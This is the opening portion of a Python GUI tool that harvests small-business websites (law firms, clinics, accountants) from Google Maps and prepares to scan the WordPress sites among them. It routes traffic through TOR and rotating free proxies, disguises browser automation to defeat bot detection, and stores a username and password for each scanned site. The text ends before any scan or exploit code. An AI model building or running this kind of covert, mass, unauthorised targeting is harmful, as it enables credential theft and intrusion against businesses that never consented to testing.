#!/usr/bin/env python3
"""
UNIFIED WORDPRESS SCANNER WITH COMPLETE ANONYMITY
Combines: URL Discovery + Proxy Management + WordPress Scanning
UPGRADED: WordPress verification for imported and discovered URLs
Features: TOR Integration, Auto Free Proxy Rotation, Stealth Mode, Quick Scan
"""

import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import queue
import time
import random
import os
import sys
import signal
import atexit
import requests
import concurrent.futures
import re
import json
import logging
from urllib.parse import quote_plus, urlparse
from datetime import datetime
from typing import List, Set, Optional

# ============= NEW SECURITY MODULES =============
try:
    import config
    import security
    import sqlite3
    from logger import get_audit_logger, get_operation_logger
    from proxy_manager import get_proxy_manager, get_tor_manager
    from scanner_engine import ScannerEngine, ResultProcessor
    SECURITY_MODULES_AVAILABLE = True
    DB_AVAILABLE = True
except ImportError as e:
    SECURITY_MODULES_AVAILABLE = False
    DB_AVAILABLE = False
    print(f"[WARN] Security modules not fully available: {e}")

# ============= URL DATABASE =============
class URLDatabase:
    """SQLite database for storing and managing discovered URLs"""
    
    def __init__(self, db_file: str = "urls.db"):
        self.db_file = db_file
        self._init_db()
    
    def _init_db(self):
        """Initialize database and create tables"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS urls (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT UNIQUE NOT NULL,
                    is_wordpress INTEGER DEFAULT -1,
                    verified_date TEXT,
                    discovered_date TEXT DEFAULT CURRENT_TIMESTAMP,
                    scan_result TEXT,
                    username TEXT,
                    password TEXT
                )
            ''')
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to initialize database: {e}")
    
    def url_exists(self, url: str) -> bool:
        """Check if URL already exists in database"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("SELECT 1 FROM urls WHERE url = ?", (url,))
            result = cursor.fetchone()
            conn.close()
            return result is not None
        except Exception as e:
            print(f"[DB ERROR] Failed to check URL: {e}")
            return False
    
    def add_url(self, url: str, is_wordpress: int = -1, verified_date: str = None) -> bool:
        """Add URL to database. Returns True if added, False if already exists"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("""
                INSERT OR IGNORE INTO urls (url, is_wordpress, verified_date)
                VALUES (?, ?, ?)
            """, (url, is_wordpress, verified_date))
            added = cursor.rowcount > 0
            conn.commit()
            conn.close()
            return added
        except Exception as e:
            print(f"[DB ERROR] Failed to add URL: {e}")
            return False
    
    def update_verification(self, url: str, is_wordpress: int):
        """Update WordPress verification status"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("""
                UPDATE urls SET is_wordpress = ?, verified_date = datetime('now')
                WHERE url = ?
            """, (is_wordpress, url))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to update verification: {e}")
    
    def update_scan_result(self, url: str, result: str, username: str = None, password: str = None):
        """Update scan result for a URL"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("""
                UPDATE urls SET scan_result = ?, username = ?, password = ?
                WHERE url = ?
            """, (result, username, password, url))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to update scan result: {e}")
    
    def get_all_urls(self, filter_type: str = "all") -> list:
        """Get all URLs with optional filter: all, verified, unverified, not_wp"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            if filter_type == "verified":
                cursor.execute("SELECT url, is_wordpress, verified_date, scan_result FROM urls WHERE is_wordpress = 1")
            elif filter_type == "unverified":
                cursor.execute("SELECT url, is_wordpress, verified_date, scan_result FROM urls WHERE is_wordpress = -1")
            elif filter_type == "not_wp":
                cursor.execute("SELECT url, is_wordpress, verified_date, scan_result FROM urls WHERE is_wordpress = 0")
            else:  # all
                cursor.execute("SELECT url, is_wordpress, verified_date, scan_result FROM urls")
            
            results = cursor.fetchall()
            conn.close()
            return results
        except Exception as e:
            print(f"[DB ERROR] Failed to get URLs: {e}")
            return []
    
    def get_url_count(self) -> dict:
        """Get URL counts by status"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM urls WHERE is_wordpress = 1")
            verified = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM urls WHERE is_wordpress = -1")
            unverified = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM urls WHERE is_wordpress = 0")
            not_wp = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) FROM urls")
            total = cursor.fetchone()[0]
            
            conn.close()
            return {"total": total, "verified": verified, "unverified": unverified, "not_wp": not_wp}
        except Exception as e:
            print(f"[DB ERROR] Failed to get counts: {e}")
            return {"total": 0, "verified": 0, "unverified": 0, "not_wp": 0}
    
    def clear_all(self):
        """Clear all URLs from database"""
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM urls")
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[DB ERROR] Failed to clear database: {e}")


# Fallback loggers if modules not available
if not SECURITY_MODULES_AVAILABLE:
    audit_logger = logging.getLogger('audit')
    operation_logger = logging.getLogger('operations')
else:
    audit_logger = get_audit_logger()
    operation_logger = get_operation_logger()

# WordPress Detector
try:
    from wordpress_detector import WordPressDetector
    WP_DETECTOR_AVAILABLE = True
except ImportError:
    WP_DETECTOR_AVAILABLE = False
    print("[INFO] WordPress detector not available - URL verification disabled")

# Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
    
    # Try undetected_chromedriver
    try:
        import undetected_chromedriver as uc
        UC_AVAILABLE = True
    except ImportError:
        UC_AVAILABLE = False
        print("[INFO] undetected_chromedriver not installed. Using standard Chrome.")
        
except ImportError:
    SELENIUM_AVAILABLE = False
    UC_AVAILABLE = False
    print("[WARN] Selenium not installed. URL discovery disabled.")

# BeautifulSoup for scanning
try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("[WARN] BeautifulSoup not installed.")

# PySocks for TOR
try:
    import socks
    import socket
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("[INFO] PySocks not installed. Install with: pip install PySocks")


# ============= ANONYMITY CONFIGURATION =============

class AnonymityConfig:
    """Configuration for anonymity features"""
    
    # TOR Configuration
    TOR_ENABLED = False
    TOR_SOCKS_HOST = "127.0.0.1"
    TOR_SOCKS_PORT = 9050
    TOR_CONTROL_PORT = 9051
    
    # Proxy Configuration
    USE_FREE_PROXIES = False  # Default off - user must enable
    AUTO_ROTATE_PROXIES = True
    PROXY_ROTATION_INTERVAL = 30
    PROXY_TEST_TIMEOUT = 5
    
    # Stealth Mode
    STEALTH_MODE = "cautious"
    DISABLE_LOGGING = True
    MEMORY_ONLY_MODE = False
    
    # Anti-Detection
    RANDOMIZE_DELAYS = True
    RANDOMIZE_USER_AGENTS = True
    
    # Session Management
    MAX_REQUESTS_PER_SESSION = 50
    BREAK_DURATION = (300, 600)
    
    # Discovery Mode
    # "direct" = no proxy (fastest, but exposes IP)
    # "proxy" = use free proxies
    # "tor" = use TOR (slowest but most anonymous)
    DISCOVERY_MODE = "direct"
    
    # Cleanup
    AUTO_CLEANUP_ON_EXIT = True


# ============= USER AGENT LIST =============

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

SCREEN_RESOLUTIONS = [
    (1920, 1080), (1366, 768), (1440, 900), (1536, 864), (1280, 720),
]

LANGUAGES = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "pt-BR,pt;q=0.9,en;q=0.8"]


# ============= DELAY CONFIGURATIONS =============

DELAY_CONFIGS = {
    "minimal": {
        "page_load": (2, 4),
        "between_listings": (1, 3),
        "between_searches": (8, 15),
        "between_scroll": (1, 2),
    },
    "cautious": {
        "page_load": (4, 8),
        "between_listings": (3, 6),
        "between_searches": (20, 40),
        "between_scroll": (2, 4),
    },
    "paranoid": {
        "page_load": (8, 15),
        "between_listings": (6, 12),
        "between_searches": (45, 90),
        "between_scroll": (3, 6),
    }
}


# ============= CITIES AND BUSINESS TYPES =============

CITIES = {
    "USA": [
        "New York NY", "Los Angeles CA", "Chicago IL", "Houston TX",
        "Phoenix AZ", "Philadelphia PA", "San Antonio TX", "San Diego CA",
        "Dallas TX", "Austin TX", "San Francisco CA", "Seattle WA",
        "Denver CO", "Boston MA", "Miami FL", "Atlanta GA"
    ],
    "Canada": [
        "Toronto ON", "Montreal QC", "Vancouver BC", "Calgary AB",
        "Edmonton AB", "Ottawa ON"
    ],
    "Brazil": [
        "Sao Paulo SP", "Rio de Janeiro RJ", "Brasilia DF", "Salvador BA",
        "Belo Horizonte MG", "Curitiba PR"
    ],
    "Portugal": [
        "Lisboa", "Porto", "Braga", "Coimbra"
    ]
}

# Country to language mapping for auto-detection
COUNTRY_LANGUAGES = {
    "Brazil": "pt",
    "Portugal": "pt",
}

BUSINESS_TYPES = {
    "Legal": ["lawyer", "law firm", "attorney"],
    "Medical": ["dentist", "dental clinic", "medical clinic"],
    "Financial": ["accountant", "CPA", "financial advisor"],
    "Beauty": ["aesthetic clinic", "spa", "beauty salon"],
    "Real Estate": ["real estate agency", "property management"]
}

# Portuguese business types (for Brazil/Portugal)
BUSINESS_TYPES_PT = {
    "Jurídico": ["advogado", "escritório de advocacia", "advogada"],
    "Médico": ["dentista", "clínica dentária", "clínica médica"],
    "Financeiro": ["contabilidade", "contador", "assessor financeiro"],
    "Beleza": ["clínica estética", "spa", "salão de beleza"],
    "Imóveis": ["imobiliária", "gestão de propriedades"]
}


# ============= PROXY MANAGER =============

class ProxyManager:
    """Manages free proxies with auto-rotation"""
    
    def __init__(self, log_callback=None):
        self.proxies: List[str] = []
        self.working_proxies: List[str] = []
        self.current_proxy: Optional[str] = None
        self.request_count = 0
        self.rotation_threshold = AnonymityConfig.PROXY_ROTATION_INTERVAL
        self.log = log_callback or print
        self.lock = threading.Lock()
        self._stop_fetching = False
        
    def fetch_from_proxyscrape(self) -> List[str]:
        """Fetch from ProxyScrape API"""
        proxies = []
        try:
            urls = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite",
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
            ]
            for url in urls:
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if ':' in line and len(line) < 30:
                            proxies.append(line)
            self.log(f"[PROXY] ProxyScrape: {len(proxies)} proxies")
        except Exception as e:
            self.log(f"[PROXY] ProxyScrape failed: {e}")
        return proxies
    
    def fetch_from_freeproxylist(self) -> List[str]:
        """Fetch from Free-Proxy-List.net"""
        proxies = []
        try:
            url = "https://free-proxy-list.net/"
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            r = requests.get(url, timeout=10, headers=headers)
            matches = re.findall(r'(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>', r.text)
            for ip, port in matches[:100]:
                proxies.append(f"{ip}:{port}")
            self.log(f"[PROXY] Free-Proxy-List: {len(proxies)} proxies")
        except Exception as e:
            self.log(f"[PROXY] Free-Proxy-List failed: {e}")
        return proxies
    
    def fetch_from_geonode(self) -> List[str]:
        """Fetch from Geonode"""
        proxies = []
        try:
            url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for proxy in data.get('data', []):
                    ip = proxy.get('ip')
                    port = proxy.get('port')
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
            self.log(f"[PROXY] Geonode: {len(proxies)} proxies")
        except Exception as e:
            self.log(f"[PROXY] Geonode failed: {e}")
        return proxies
    
    def test_proxy(self, proxy: str, timeout: int = 5) -> bool:
        """Test if a proxy works"""
        try:
            proxies_dict = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            r = requests.get(
                'https://httpbin.org/ip',
                proxies=proxies_dict,
                timeout=timeout
            )
            return r.status_code == 200
        except (requests.RequestException, Exception) as e:
            audit_logger.debug_event("PROXY_TEST", f"Proxy {proxy} failed: {type(e).__name__}")
            return False
    
    def fetch_all_proxies(self, test_proxies: bool = True, max_workers: int = 20,
                          progress_callback=None):
        """Fetch proxies from all sources and optionally test them"""
        self.log("[PROXY] Fetching proxies from all sources...")
        self._stop_fetching = False
        
        all_proxies = set()
        
        sources = [
            self.fetch_from_proxyscrape,
            self.fetch_from_freeproxylist,
            self.fetch_from_geonode,
        ]
        
        for source in sources:
            if self._stop_fetching:
                break
            try:
                proxies = source()
                all_proxies.update(proxies)
                time.sleep(random.uniform(1, 2))
            except Exception as e:
                self.log(f"[PROXY] Source error: {e}")
        
        self.proxies = list(all_proxies)
        self.log(f"[PROXY] Total unique proxies: {len(self.proxies)}")
        
        if test_proxies and self.proxies:
            self.log(f"[PROXY] Testing {len(self.proxies)} proxies...")
            working = []
            total = len(self.proxies)
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_proxy = {
                    executor.submit(self.test_proxy, proxy): proxy 
                    for proxy in self.proxies
                }
                
                for i, future in enumerate(concurrent.futures.as_completed(future_to_proxy), 1):
                    if self._stop_fetching:
                        break
                    proxy = future_to_proxy[future]
                    try:
                        if future.result():
                            working.append(proxy)
                            self.log(f"[PROXY] {proxy} - WORKING")
                    except (concurrent.futures.TimeoutError, Exception) as e:
                        audit_logger.debug_event("PROXY_FETCH", f"Proxy check failed: {type(e).__name__}")
                    
                    if progress_callback:
                        progress_callback(i, total)
            
            self.working_proxies = working
            self.log(f"[PROXY] {len(working)} working proxies found")
        else:
            self.working_proxies = self.proxies
        
        return self.working_proxies
    
    def get_proxy(self) -> Optional[str]:
        """Get current proxy or rotate if needed"""
        with self.lock:
            if not self.working_proxies:
                return None
            
            if (self.current_proxy is None or 
                self.request_count >= self.rotation_threshold):
                self.rotate_proxy()
            
            self.request_count += 1
            return self.current_proxy
    
    def rotate_proxy(self):
        """Rotate to a new proxy"""
        if self.working_proxies:
            self.current_proxy = random.choice(self.working_proxies)
            self.request_count = 0
            self.rotation_threshold = random.randint(20, 40)
            self.log(f"[PROXY] Rotated to: {self.current_proxy}")
    
    def get_proxy_dict(self) -> Optional[dict]:
        """Get proxy in requests format"""
        proxy = self.get_proxy()
        if proxy:
            return {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
        return None
    
    def stop(self):
        """Stop fetching"""
        self._stop_fetching = True
    
    def save_to_file(self, filename: str = "working_proxies.txt"):
        """Save working proxies to file"""
        try:
            with open(filename, 'w') as f:
                for proxy in self.working_proxies:
                    f.write(proxy + '\n')
            self.log(f"[PROXY] Saved {len(self.working_proxies)} proxies to {filename}")
        except Exception as e:
            self.log(f"[PROXY] Save failed: {e}")
    
    def load_from_file(self, filename: str = "working_proxies.txt"):
        """Load proxies from file"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    self.working_proxies = [line.strip() for line in f if line.strip()]
                self.log(f"[PROXY] Loaded {len(self.working_proxies)} proxies from {filename}")
        except Exception as e:
            self.log(f"[PROXY] Load failed: {e}")


# ============= TOR MANAGER =============

class TORManager:
    """Manages TOR network connection for requests (not Selenium)"""
    
    def __init__(self, log_callback=None):
        self.log = log_callback or print
        self.enabled = False
        self.original_socket = None
        
    def check_tor_running(self) -> bool:
        """Check if TOR is running"""
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(5)
            result = test_socket.connect_ex((
                AnonymityConfig.TOR_SOCKS_HOST,
                AnonymityConfig.TOR_SOCKS_PORT
            ))
            test_socket.close()
            return result == 0
        except Exception as e:
            audit_logger.debug_event("TOR_CHECK", f"Socket check failed: {type(e).__name__}")
            return False
    
    def enable_tor(self) -> bool:
        """Route requests traffic through TOR (for scanning only, not Selenium)"""
        if not SOCKS_AVAILABLE:
            self.log("[TOR] PySocks not installed. Run: pip install PySocks")
            return False
        
        if not self.check_tor_running():
            self.log("[TOR] TOR is not running on port 9050")
            self.log("[TOR] Please start TOR service first")
            return False
        
        try:
            self.original_socket = socket.socket
            socks.set_default_proxy(
                socks.SOCKS5, 
                AnonymityConfig.TOR_SOCKS_HOST, 
                AnonymityConfig.TOR_SOCKS_PORT
            )
            socket.socket = socks.socksocket
            
            # Verify TOR connection
            response = requests.get('https://check.torproject.org/api/ip', timeout=30)
            data = response.json()
            
            if data.get('IsTor'):
                self.enabled = True
                self.log(f"[TOR] Connected! Exit IP: {data.get('IP', 'Unknown')}")
                return True
            else:
                self.log("[TOR] Connected but not using TOR network")
                self.disable_tor()
                return False
                
        except Exception as e:
            self.log(f"[TOR] Failed to enable: {e}")
            if self.original_socket:
                socket.socket = self.original_socket
            return False
    
    def disable_tor(self):
        """Disable TOR and restore normal connection"""
        if self.original_socket:
            socket.socket = self.original_socket
        self.enabled = False
        self.log("[TOR] Disabled")
    
    def get_current_ip(self) -> str:
        """Get current exit IP"""
        try:
            # Use a simple IP check service
            response = requests.get('https://api.ipify.org?format=json', timeout=10)
            return response.json().get('ip', 'Unknown')
        except Exception as e:
            return f'Error: {e}'


# ============= STEALTH DRIVER =============

class StealthDriver:
    """Creates Chrome driver with stealth features - NO proxy for Selenium"""
    
    def __init__(self, log_callback=None):
        self.log = log_callback or print
        self.driver = None
        self.user_agent = random.choice(USER_AGENTS)
        
    def create(self):
        """Create Chrome driver with anti-detection"""
        if not SELENIUM_AVAILABLE:
            self.log("[DRIVER] Selenium not available")
            return None
        
        try:
            if UC_AVAILABLE:
                return self._create_undetected()
            else:
                return self._create_standard()
                
        except Exception as e:
            self.log(f"[DRIVER] Failed to create: {e}")
            # Try standard Chrome as fallback
            try:
                return self._create_standard()
            except Exception as e2:
                self.log(f"[DRIVER] Fallback also failed: {e2}")
                return None
    
    def _create_undetected(self):
        """Create undetected Chrome driver"""
        options = uc.ChromeOptions()
        
        # Basic options
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        
        # Window size
        width, height = random.choice(SCREEN_RESOLUTIONS)
        options.add_argument(f"--window-size={width},{height}")
        
        # Language
        lang = random.choice(LANGUAGES)
        options.add_argument(f"--lang={lang.split(',')[0]}")
        
        # Disable automation flags
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        options.add_experimental_option("useAutomationExtension", False)
        
        # Disable WebRTC
        options.add_argument("--disable-webrtc")
        
        # Logging
        options.add_argument("--log-level=3")
        
        # Create driver - let undetected_chromedriver handle user agent internally
        self.driver = uc.Chrome(options=options, version_main=None)
        
        # Inject stealth JS after driver creation
        self._inject_stealth_js()
        
        self.log(f"[DRIVER] Undetected Chrome created (window: {width}x{height})")
        return self.driver
    
    def _create_standard(self):
        """Create standard Chrome driver as fallback"""
        options = Options()
        
        options.add_argument("--headless=new")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-gpu")
        options.add_argument(f"--user-agent={self.user_agent}")
        
        width, height = random.choice(SCREEN_RESOLUTIONS)
        options.add_argument(f"--window-size={width},{height}")
        
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        options.add_experimental_option("useAutomationExtension", False)
        
        self.driver = webdriver.Chrome(options=options)
        
        self.log(f"[DRIVER] Standard Chrome created")
        return self.driver
    
    def _inject_stealth_js(self):
        """Inject JavaScript to mask automation"""
        if not self.driver:
            return
            
        stealth_script = """
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
        window.chrome = {runtime: {}};
        """
        
        try:
            self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": stealth_script
            })
        except (AttributeError, Exception) as e:
            audit_logger.debug_event("ENABLE_CDP", f"CDP not supported: {type(e).__name__}")
    
    def quit(self):
        """Close driver"""
        if self.driver:
            try:
                self.driver.quit()
            except (WebDriverException, Exception) as e:
                audit_logger.debug_event("DRIVER_QUIT", f"Failed to quit: {type(e).__name__}")
            self.driver = None


# ============= URL COLLECTOR =============

class URLCollector:
    """Collects URLs from Google Maps with stealth"""
    
    def __init__(self, log_callback=None, db_check_func=None):
        self.log = log_callback or print
        self.driver = None
        self.collected_urls = set()
        self._stop = False
        self.stealth_mode = AnonymityConfig.STEALTH_MODE
        self.db_check_func = db_check_func  # Function to check for duplicates in database
        
    def _get_delay(self, delay_type: str) -> float:
        """Get randomized delay"""
        min_d, max_d = DELAY_CONFIGS[self.stealth_mode][delay_type]
        delay = random.uniform(min_d, max_d)
        if random.random() < 0.1:
            delay += random.uniform(1, 3)
        return delay
    
    def _create_driver(self):
        """Create new stealth driver"""
        stealth = StealthDriver(log_callback=self.log)
        self.driver = stealth.create()
        return self.driver
    
    def _human_scroll(self, scrolls: int = 3):
        """Human-like scrolling"""
        if not self.driver:
            return
        
        for _ in range(scrolls):
            scroll_amount = random.randint(300, 800)
            try:
                self.driver.execute_script(f"window.scrollBy(0, {scroll_amount})")
            except Exception as e:
                audit_logger.debug_event("SCROLL", f"Scroll failed: {type(e).__name__}")
            time.sleep(self._get_delay("between_scroll"))
            
            if random.random() < 0.2:
                back_scroll = random.randint(50, 150)
                try:
                    self.driver.execute_script(f"window.scrollBy(0, -{back_scroll})")
                except Exception as e:
                    audit_logger.debug_event("SCROLL", f"Back scroll failed: {type(e).__name__}")
                time.sleep(random.uniform(0.5, 1.5))
    
    def _safe_get(self, url: str):
        """Safely load URL"""
        self.log(f"[COLLECT] Loading: {url[:60]}...")
        try:
            self.driver.set_page_load_timeout(30)
            self.driver.get(url)
        except TimeoutException:
            self.log("[COLLECT] Timeout, stopping page load")
            try:
                self.driver.execute_script("window.stop();")
            except Exception as e:
                audit_logger.debug_event("PAGE_LOAD", f"Stop script failed: {type(e).__name__}")
        except Exception as e:
            self.log(f"[COLLECT] Load error: {e}")
        
        time.sleep(self._get_delay("page_load"))
    
    def collect_from_maps(self, countries: List[str] = None, max_urls: int = 200, 
                          progress_callback=None):
        """Collect URLs from Google Maps"""
        if not SELENIUM_AVAILABLE:
            self.log("[COLLECT] Selenium not available")
            return set()
        
        self.collected_urls = set()
        self._stop = False
        
        try:
            self._create_driver()
            if not self.driver:
                self.log("[COLLECT] Failed to create browser")
                return self.collected_urls
            
            # Build queries
            if countries is None:
                countries = list(CITIES.keys())
            
            # Build queries with per-country language matching
            queries = []
            for country in countries:
                if country not in CITIES:
                    continue
                # Select business types based on country language
                country_lang = COUNTRY_LANGUAGES.get(country, "en")
                if country_lang == "pt":
                    business_types = BUSINESS_TYPES_PT
                else:
                    business_types = BUSINESS_TYPES
                self.log(f"[COLLECT] {country}: using {'Portuguese' if country_lang == 'pt' else 'English'} search terms")
                for city in CITIES[country]:
                    for category, businesses in business_types.items():
                        for business in businesses:
                            queries.append(f"{business} {city}")
            
            random.shuffle(queries)
            self.log(f"[COLLECT] {len(queries)} queries prepared, target: {max_urls} URLs")
            
            request_count = 0
            
            for i, query in enumerate(queries, 1):
                if self._stop or len(self.collected_urls) >= max_urls:
                    break
                
                # Session limit check
                request_count += 1
                if request_count >= AnonymityConfig.MAX_REQUESTS_PER_SESSION:
                    self.log("[COLLECT] Session limit, restarting browser...")
                    try:
                        self.driver.quit()
                    except Exception as e:
                        audit_logger.debug_event("COLLECT", f"Driver quit failed (session limit): {type(e).__name__}")
                    time.sleep(random.uniform(5, 15))
                    self._create_driver()
                    if not self.driver:
                        break
                    request_count = 0
                
                self.log(f"[COLLECT] [{i}/{len(queries)}] {query}")
                if progress_callback:
                    progress_callback(i, len(queries), len(self.collected_urls))
                
                # Search Google Maps
                search_url = f"https://www.google.com/maps/search/{quote_plus(query)}"
                self._safe_get(search_url)
                
                # Wait for results
                try:
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((
                            By.XPATH,
                            '//a[contains(@href, "/maps/place/")] | //div[@role="feed"]'
                        ))
                    )
                except Exception as e:
                    audit_logger.debug_event("COLLECT", f"Results load check failed: {type(e).__name__}")
                    self.log("[COLLECT] Results not fully loaded, continuing...")
                
                time.sleep(random.uniform(2, 4))
                
                # Scroll and collect
                self._human_scroll(scrolls=random.randint(2, 4))
                
                try:
                    anchors = self.driver.find_elements(
                        By.XPATH,
                        '//a[contains(@href, "/maps/place/")]'
                    )
                except Exception as e:
                    audit_logger.debug_event("COLLECT", f"Anchor lookup failed: {type(e).__name__}")
                    anchors = []
                
                listing_links = []
                for a in anchors:
                    try:
                        href = a.get_attribute("href")
                        if href and "/maps/place/" in href:
                            listing_links.append(href)
                    except Exception as e:
                        audit_logger.debug_event("COLLECT", f"Anchor href failed: {type(e).__name__}")
                for j, listing_url in enumerate(listing_links, 1):
                    if self._stop or len(self.collected_urls) >= max_urls:
                        break
                    
                    self._safe_get(listing_url)
                    
                    # Find website link
                    website = None
                    xpaths = [
                        '//a[@data-item-id="authority"]',
                        '//a[contains(@aria-label, "Website")]',
                        '//a[contains(@aria-label, "Site")]',
                    ]
                    
                    for xpath in xpaths:
                        try:
                            element = WebDriverWait(self.driver, 3).until(
                                EC.presence_of_element_located((By.XPATH, xpath))
                            )
                            href = element.get_attribute("href")
                            if href and href.startswith("http") and "google.com" not in href:
                                website = href
                                break
                        except Exception as e:
                            audit_logger.debug_event("COLLECT", f"XPath lookup failed: {type(e).__name__}")
                            continue
                    
                    if website and website not in self.collected_urls:
                        # Check for duplicates using database if available
                        if self.db_check_func and self.db_check_func(website):
                            self.log(f"[COLLECT] Duplicate skipped: {website}")
                            continue
                        self.collected_urls.add(website)
                        self.log(f"[COLLECT] Found: {website}")
                    
                    time.sleep(self._get_delay("between_listings"))
                
                time.sleep(self._get_delay("between_searches"))
            
            self.log(f"[COLLECT] Complete! {len(self.collected_urls)} URLs collected")
            return self.collected_urls
            
        except Exception as e:
            self.log(f"[COLLECT] Error: {e}")
            import traceback
            self.log(traceback.format_exc())
            return self.collected_urls
            
        finally:
            if self.driver:
                try:
                    self.driver.quit()
                except Exception as e:
                    audit_logger.debug_event("COLLECT", f"Driver quit failed: {type(e).__name__}")
                self.driver = None
    
    def stop(self):
        """Stop collection"""
        self._stop = True
        if self.driver:
            try:
                self.driver.quit()
            except Exception as e:
                audit_logger.debug_event("COLLECT", f"Driver stop failed: {type(e).__name__}")


# ============= WORDPRESS SCANNER =============

class WordPressScanner:
    """Scans WordPress sites for vulnerabilities"""
    
    def __init__(self, proxy_manager: ProxyManager, tor_manager: TORManager, log_callback=None):
        self.proxy_manager = proxy_manager
        self.tor_manager = tor_manager
        self.log = log_callback or print
        self._stop = False
        self.results = []
        self.stats = {"scanned": 0, "found": 0, "errors": 0}
        
    def _get_session(self) -> requests.Session:
        """Get configured secure session (SECURITY CRITICAL)"""
        # Use security module if available
        if SECURITY_MODULES_AVAILABLE:
            proxy = None
            
            # Get proxy if configured
            if config.USE_PROXIES:
                try:
                    proxy_mgr = get_proxy_manager()
                    proxy_obj = proxy_mgr.get_random_proxy()
                    if proxy_obj:
                        proxy = proxy_obj.get_requests_dict()
                except Exception:
                    pass
            
            # Create session with SSL verification enabled
            session_obj = security.get_secure_session(
                verify_ssl=config.VERIFY_SSL,  # Always True
                timeout=config.REQUEST_TIMEOUT,
                user_agent=random.choice(USER_AGENTS),
                proxy=proxy
            )
            return session_obj.session
        
        # Fallback for legacy mode
        session = requests.Session()
        session.headers['User-Agent'] = random.choice(USER_AGENTS)
        session.verify = True  # SECURITY FIX: SSL verification enabled
        
        # Proxy setup
        if not self.tor_manager.enabled and AnonymityConfig.USE_FREE_PROXIES:
            proxy_dict = self.proxy_manager.get_proxy_dict()
            if proxy_dict:
                session.proxies = proxy_dict
        
        return session
    
    def is_wordpress(self, url: str, timeout: int = 10) -> bool:
